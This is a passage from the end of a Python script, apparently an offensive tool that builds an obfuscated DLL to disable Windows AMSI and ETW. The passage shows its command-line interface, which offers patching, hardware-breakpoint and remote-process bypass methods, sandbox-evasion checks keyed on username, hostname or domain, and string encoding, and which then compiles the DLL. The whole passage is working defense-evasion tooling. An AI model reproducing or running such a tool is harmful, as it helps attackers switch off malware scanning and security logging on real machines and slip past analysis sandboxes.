    print(f"[!] DLL compiled successfully! Saved to: {outfile}")


if __name__ == '__main__':
    print(inspiration[1:-1])
    parser = argparse.ArgumentParser(description="Generate an obfuscated DLL that will disable AMSI & ETW")
    parser.add_argument('-m', '--method', dest='method', help='Bypass technique (Options: patch, hwbp, remote_patch) (Default: patch)', metavar='<method>', default='patch')
    parser.add_argument('-s', '--sandbox', dest='sandbox', help='Sandbox evasion technique (Options: mathsleep, username, hostname, domain) (Default: mathsleep)', metavar='<option>', default='mathsleep')
    parser.add_argument('-sa', '--sandbox-arg', dest='sandbox_arg', help='Argument for sandbox evasion technique (Ex: WIN10CO-DESKTOP, testlab.local)', metavar='<value>', default='')
    parser.add_argument('-k', '--key', dest='key', help='Key to encode strings with (randomly generated by default)', metavar='<key>', default='')
    parser.add_argument('-o', '--outfile', dest='outfile', help='File to save DLL to', metavar='<outfile>', default='out.dll')
    remote_options = parser.add_argument_group('Remote options')
    remote_options.add_argument('-p', '--pid', dest='pid', metavar='<pid>', help='PID of remote process to patch', default='')
    args = parser.parse_args()
    method = args.method.lower()
    sandbox = args.sandbox.lower()
    sandbox_arg = args.sandbox_arg
    if sandbox != "username" and sandbox != "hostname" and sandbox != "domain" and sandbox != "mathsleep":
        print(sandbox)
        print("[!] Invalid sandbox evasion option! Options are: username, hostname, domain, mathsleep")
        exit()
    if sandbox != "mathsleep" and sandbox_arg == "":
        parser.print_help()
        print("\n[!] No sandbox argument! You must supply a value to the and -sa flag.")
        exit()
    if method != "patch" and method != "remote_patch" and method != "hwbp":
        parser.print_help()
        print("\n[!] Invalid bypass technique specified! Please supply either 'patch', 'remote_patch', or 'hwbp' to the -m flag.")
        exit()
    execute(template, method, args.key, sandbox, sandbox_arg, args.outfile, args.pid)
